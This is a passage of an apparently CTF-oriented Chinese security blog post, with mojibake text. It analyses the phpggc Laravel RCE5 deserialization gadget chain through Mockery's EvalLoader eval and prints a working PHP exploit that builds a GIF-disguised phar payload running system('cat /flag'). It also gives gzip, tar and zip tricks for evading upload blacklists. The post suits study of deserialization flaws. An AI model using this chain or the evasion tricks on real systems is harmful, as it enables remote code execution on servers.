deserialize(path)</span><br><span class="line">    os.unlink(&quot;crispr.phar.png&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="è·Ÿè¿›ä¸€ä¸‹phpggc-laravel-rce5çš„é“¾å­"><a href="#è·Ÿè¿›ä¸€ä¸‹phpggc-laravel-rce5çš„é“¾å­" class="headerlink" title="è·Ÿè¿›ä¸€ä¸‹phpggc laravel rce5çš„é“¾å­"></a>è·Ÿè¿›ä¸€ä¸‹phpggc laravel rce5çš„é“¾å­</h2><p>è¿™ä¸ªé“¾å­å®é™…ä¸Šæ˜¯Laravelæ¡†æ¶ä¸­<strong>mockeryç»„ä»¶</strong>çš„æ¼æ´</p>
<p>å…¥å£åœ¨PendingBroadcast.phpçš„__destruct</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150722137.png" alt="image-20211128150722137" loading="lazy"></p>
<p>å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„dispachæ–¹æ³•</p>
<p>è¿™é‡Œé€‰ç”¨äº†dispatcher.php</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150952069.png" alt="image-20211128150952069" loading="lazy"></p>
<p>æˆ‘ä»¬éœ€è¦çš„æ˜¯<code>$this-&gt;dispatchToQueue</code>è¿™ä¸ªæ–¹æ³•ï¼Œå°±è¦ä½¿å‰ä¸¤ä¸ªæ¡ä»¶å‡æˆç«‹ï¼Œè€Œåæ–‡ä¼šåˆ†æthis-&gt;queueResolverå¯æ§ï¼Œå…ˆè·Ÿè¿›ä¸€ä¸‹commandShouldBequeued</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151614038.png" alt="image-20211128151614038" loading="lazy"></p>
<p>$commandéœ€è¦ä¸ºå®ç°ShouldQueueæ¥å£çš„å®ä¾‹ï¼Œè¿™é‡Œä½¿ç”¨äº†BroadCastEvent.php</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151728252.png" alt="image-20211128151728252" loading="lazy"></p>
<p>å›åˆ°å…ˆå‰çš„éœ€è¦æ»¡è¶³ä¸¤ä¸ªIFæ¡ä»¶ååˆ©ç”¨çš„æ–¹æ³•dispatchToQueue</p>
<p>è·Ÿè¿›ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151045404.png" alt="image-20211128151045404" loading="lazy"></p>
<p>å¯ä»¥çœ‹åˆ°æ­¤å¤„è°ƒç”¨äº†call_user_funcï¼Œå¦‚æœä¸¤ä¸ªå‚æ•°éƒ½å¯æ§å°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151131963.png" alt="image-20211128151131963" loading="lazy"></p>
<p>çœ‹ä¸€ä¸‹æ„é€ å‡½æ•°ï¼Œå‘ç°$this-&gt;queueResolverå¯æ§</p>
<p>è€Œ$connectionæ˜¯$commandçš„æˆå‘˜ï¼Œ$commandå¯æ§ï¼Œåˆ™$connectionä¹Ÿå¯æ§ï¼Œæ‰€ä»¥æ­¤å¤„å°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p>å…¨å±€æœç´¢ä¸€ä¸‹evalæ–¹æ³•ï¼Œå‘ç°å­˜åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class EvalLoader implements Loader</span><br><span class="line">&#123;</span><br><span class="line">    public function load(MockDefinition $definition)</span><br><span class="line">    &#123;</span><br><span class="line">        if (class_exists($definition-&gt;getClassName(), false)) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        eval(&quot;?&gt;&quot; . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥EvalLoaderç±»çš„loadæ–¹æ³•å­˜åœ¨<code>eval()</code></p>
<p>call_user_funcå‡½æ•°åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ•°ç»„çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬é€‰æ‹©çš„ç±»ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç±»ä¸‹çš„æ–¹æ³•ï¼›æ‰€ä»¥è¿™é‡Œç›´æ¥å»åˆ°EvalLoaderç±»ï¼Œå»æ‰§è¡Œloadæ–¹æ³•ä»è€Œè°ƒç”¨åˆ°evalå‡½æ•°ï¼›è¿™é‡Œå‘ç°å­˜åœ¨å‚æ•°ï¼Œè€Œä¸”å‚æ•°å¿…é¡»æ˜¯MockDefinitionç±»çš„å®ä¾‹,ä¹Ÿå³æ˜¯æ„å‘³ç€æˆ‘ä»¬connectionéœ€è¦ä¸ºMockDefinitionç±»çš„å®ä¾‹,å¹¶ä¸”è¦æ‰§è¡Œ<code>eval</code>,å¿…é¡»ä½¿å¾—<code>if</code>è¿”å›<code>false</code></p>
<p>æ¥è¿½æº¯åˆ°MockDefinitionç±»:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(MockConfiguration $config, $code)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!$config-&gt;getName()) &#123;</span><br><span class="line">            throw new \InvalidArgumentException(&quot;MockConfiguration must contain a name&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;config = $config;</span><br><span class="line">        $this-&gt;code = $code;</span><br><span class="line">    &#125;</span><br><span class="line">public function getClassName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;config-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line">public function getCode()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;code;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å…¨å±€æœç´¢<code>getName()</code>æ–¹æ³•ï¼Œå¹¶ä¸”å®ç°<code>MockConfiguration</code>æ¥å£,æ‰¾åˆ°äº†<code>MockConfiguration.php</code>ä¸­:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getName()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;name;  //$this-&gt;nameæ˜¯å¯æ§çš„</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤å½“æˆ‘ä»¬ä½¿å¾—<code>$this-&gt;config</code>ä¸ºè¯¥ç±»æ—¶ï¼Œé‚£ä¹ˆè°ƒç”¨getNameèƒ½å¤Ÿè¿”å›ä»»æ„å€¼ï¼Œä»è€Œä½¿å¾—è¯¥ä»»æ„å€¼ç»„æˆçš„ç±»ä¸å­˜åœ¨è€Œè°ƒç”¨eval,è€Œ<code>$this-&gt;code</code>å°±æ˜¯æ‹¼æ¥åœ¨<code>eval</code>ä¸­çš„å‘½ä»¤</p>
<h3 id="phpggc-laravel-rce5-exp"><a href="#phpggc-laravel-rce5-exp" class="headerlink" title="phpggc laravel rce5 exp"></a>phpggc laravel rce5 exp</h3><p>æ‘˜è‡ªç½‘ä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    use Illuminate\Contracts\Events\Dispatcher;</span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $event;</span><br><span class="line">        //__destructææ„æ–¹æ³•æ˜¯è°ƒç”¨$this-&gt;eventsç±»çš„dispatchæ–¹æ³•ï¼Œè¿™é‡Œæ˜¯è°ƒç”¨Dispatcherç±»çš„dispatchæ–¹æ³•</span><br><span class="line">        protected $events;</span><br><span class="line">        public function __construct($events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">        //eventæ˜¯dispatchæ–¹æ³•çš„å‚æ•°,ä¹Ÿå°±æ˜¯$command,è€Œ$commandéœ€è¦å®ç°ShouldQueueæ¥å£,å› æ­¤è¿™é‡Œ$eventæ˜¯é€‰æ‹©BroadcastEventç±»</span><br><span class="line">        $this-&gt;event = $event;</span><br><span class="line">        $this-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class BroadcastEvent&#123;</span><br><span class="line">        //è¿™é‡Œ$connectionä½œä¸ºcall_user_funcçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯é™æ€ç±»EvalLoaderä¸­load()æ–¹æ³•çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯$definition</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct($connection)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus&#123;</span><br><span class="line">    class Dispatcher</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        public function __construct($queueResolver)</span><br><span class="line">        &#123;</span><br><span class="line">            //queueResolveræ˜¯åç»­call_user_func_array()çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦è°ƒç”¨é™æ€ç±»æ–¹æ³•æ‰§è¡Œeval</span><br><span class="line">            $this-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">        //$commandéœ€è¦å®ç°ShouldQueueæ¥å£æ—¶commandShouldBeQueuedæ–¹æ³•æ‰ä¼šè¿”å›çœŸï¼Œè¿™é‡Œä½¿ç”¨BroadcastEventç±»</span><br><span class="line">        public function dispatch($command)</span><br><span class="line">        &#123;</span><br><span class="line">            //éœ€è¦ä½¿ä¸‰ç›®è¿ç®—ç¬¦çš„åˆ¤æ–­å¼ä¸ºçœŸï¼Œæ‰èƒ½è°ƒç”¨dispatchToQueueæ–¹æ³•è¿›è€Œè°ƒç”¨call_user_func_array</span><br><span class="line">            return $this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</span><br><span class="line">                        ? $this-&gt;dispatchToQueue($command)</span><br><span class="line">                        : $this-&gt;dispatchNow($command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Loader&#123;</span><br><span class="line">    use Mockery\Generator\MockDefinition;</span><br><span class="line">    class EvalLoader</span><br><span class="line">    &#123;</span><br><span class="line">        //è¿™é‡Œ$definitionéœ€è¦å®ç°MockDefinitionæ¥å£ï¼Œå› æ­¤é€‰å–çš„æ˜¯MockDefinitionç±»</span><br><span class="line">        public function load(MockDefinition $definition)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockDefinition</span><br><span class="line">    &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        //è¿™é‡Œ$this-&gt;configè®¾ç½®ä¸ºMockConfigurationç±»ï¼Œå…¶getnameæ–¹æ³•å’Œå‚æ•°å¯æ§èƒ½å¤Ÿå¾—åˆ°ä»»æ„å­—ç¬¦ä½œä¸ºgetClassName()çš„è¿”å›å€¼</span><br><span class="line">        public function __construct($config, $code)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;config = $config;</span><br><span class="line">            //$this-&gt;code ä½œä¸ºEvalLoaderç±»ä¸­loadæ–¹æ³•ä¸­eval()çš„æ‹¼æ¥å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦å®ç°å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹</span><br><span class="line">            $this-&gt;code = $code;    </span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockConfiguration&#123;</span><br><span class="line">        protected $name;</span><br><span class="line">        public function __construct($name)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;name = $name;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    //å…ˆä½¿å¾—$this-&gt;nameè¿”å›crispr,è¿™æ ·è°ƒç”¨class_exists()æ—¶æ²¡æœ‰crisprç±»è‚¯å®šä¼šè¿”å›false</span><br><span class="line">    $mockconfiguration = new Mockery\Generator\MockConfiguration(&quot;crispr&quot;);</span><br><span class="line">    //ä½¿å¾—$this-&gt;configä¸ºMockConfigurationç±»åè°ƒç”¨getnameæ–¹æ³•,åé¢ä¸ºevalçš„æ‹¼æ¥å‚æ•°ï¼Œè¿™é‡Œå†™ä¸ªä¸€å¥è¯</span><br><span class="line">    $mockdefinition = new \Mockery\Generator\MockDefinition($mockconfiguration,&#x27;&lt;?php echo system(&quot;cat /flag&quot;);?&gt;&#x27;);</span><br><span class="line">    $evalloader = new \Mockery\Loader\EvalLoader();</span><br><span class="line">    //MockDefinitionç±»å®ç°äº†MockDefinitionæ¥å£ä½œä¸ºloadæ–¹æ³•çš„å‚æ•°</span><br><span class="line">    $broadcastevent = new Illuminate\Broadcasting\BroadcastEvent($mockdefinition);</span><br><span class="line">    //è¯¥dispatcherè°ƒç”¨EvalLoaderçš„loadæ–¹æ³•</span><br><span class="line">    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,&quot;load&quot;));</span><br><span class="line">    //ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè°ƒç”¨Dispatcherç±»çš„dispactæ–¹æ³•,ç¬¬äºŒä¸ªå‚æ•°æ˜¯å®ç°ShouldQueueçš„$command</span><br><span class="line">    $exp = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$broadcastevent);</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span><br><span class="line">    $phar-&gt;setMetadata($exp); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">    //ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ç”±unser-nameå’Œtinypngæ”¶è·çš„æ€»ç»“"><a href="#ç”±unser-nameå’Œtinypngæ”¶è·çš„æ€»ç»“" class="headerlink" title="ç”±unser_nameå’Œtinypngæ”¶è·çš„æ€»ç»“"></a>ç”±unser_nameå’Œtinypngæ”¶è·çš„æ€»ç»“</h2><p>ç”Ÿæˆå®Œpharå†æ‰§è¡Œgzip phar.pharæˆ–è€…bzip2 phar.phar</p>
<p>æ•ˆæœå¦‚ä¸‹ã€‚å¯ä»¥è¿‡é»‘åå•æ£€æµ‹<br><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128152813712.png" alt="image-20211128152813712" loading="lazy"></p>
<p>å°†åºåˆ—åŒ–çš„æ•°æ®å†™å…¥.phar/.metadataXXXXä¸­ï¼Œå†å›é€€ä¸Šä¸€çº§æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf test.tar .phar/</span><br></pre></td></tr></table></figure>

<p>å†ç”¨pharåè®®è§£æå¯¹åº”çš„taråŒ…ä¹Ÿå¯ä»¥è§¦å‘ååºåˆ—åŒ–</p>
<p><strong>Zip:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=serialize(new a());</span><br><span class="line">$zip = new ZipArchive;</span><br><span class="line">$res = $zip-&gt;open(&#x27;test.zip&#x27;, ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($a);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡zipçš„æ³¨é‡Šé‡Œä¸èƒ½æœ‰00.é«˜ç‰ˆæœ¬å¯ä»¥ç”¨å¤§å†™Sï¼Œ16è¿›åˆ¶æ›¿æ¢%00ã€‚æ³¨æ„å‘½åç©ºé—´ç±»çš„\å’Œ16è¿›åˆ¶çš„\å†²çªã€‚<br>è§£å†³ï¼š\æ›¿æ¢\5c<br>åˆ«æŠŠä¸æ˜¯Sé‡Œçš„\ä¹Ÿæ›¿æ¢äº†å“¦ã€‚</p>
<h2 id="ä»æºç è§’åº¦çœ‹pharä¸ºä»€ä¹ˆèƒ½è§£æè¿™å‡ ç±»å‹ç¼©åŒ…"><a href="#ä»æºç è§’åº¦çœ‹pharä¸ºä»€ä¹ˆèƒ½è§£æè¿™å‡ ç±»å‹ç¼©åŒ…" class="headerlink" title="ä»æºç è§’åº¦çœ‹pharä¸ºä»€ä¹ˆèƒ½è§£æè¿™å‡ ç±»å‹ç¼©åŒ…"></a>ä»æºç è§’åº¦çœ‹pharä¸ºä»€ä¹ˆèƒ½è§£æè¿™å‡ ç±»å‹ç¼©åŒ…</h2><p><a target="_blank" rel="noopener" href="https://gywbd.github.io/posts/2016/2/zend-execution-engine.html">æ·±å…¥ç†è§£Zendæ‰§è¡Œå¼•æ“ï¼ˆPHP5ï¼‰ - GongYong (gywbd.github.io)</a></p>
<p>ç®—æ˜¯å‰ç½®çŸ¥è¯†ï¼Œç°åœ¨åŸºæœ¬çœ‹ä¸æ‡‚ï¼Œæ—¥åå†æ¥ã€‚</p>
<p>ä»æºç è§’åº¦åˆ†æ</p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uxwHLckwx/">ä»è™ç¬¦çº¿ä¸‹CTFæ·±å…¥ååºåˆ—åŒ–åˆ©ç”¨ | (guokeya.github.io)</a></p>
<p>è¯†åˆ«æ–‡ä»¶å¤´ï¼Œè¯†åˆ«æ–‡ä»¶åã€‚</p>
<p>debugæ’ä»¶æ²¡æ•´æ˜ç™½ï¼Œæš‚æ—¶å…ˆä¸è·Ÿäº†ã€‚</p>
<h2 id="end"><a href="#end" class="headerlink" title="end"></a><strong>end</strong></h2></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>th0me</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://example.com/2021/11/28/unser_name/" title="thinkphp5.0.23rce">http://example.com/2021/11/28/unser_name/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/11/24/thinkphp5.0.23rce/" rel="next" title="thinkphp5.0.23rce"><span class="post-nav-text">thinkphp5.0.23rce</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>è‹¥æ‚¨æƒ³åŠæ—¶å¾—åˆ°å›å¤æé†’ï¼Œå»ºè®®è·³è½¬ GitHub Issues è¯„è®ºã€‚</span><br><span>è‹¥æ²¡æœ‰æœ¬æ–‡ Issueï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Comment æ¨¡ç‰ˆæ–°å»ºã€‚</span><br></div><style>.utterances {
  max-width: 100%;
}</style><script src="https://utteranc.es/client.js" repo="th0me/github.io.comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 â€“ 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> th0me</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#B9897F" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div id="local-search-result"></div></div></div></body></html>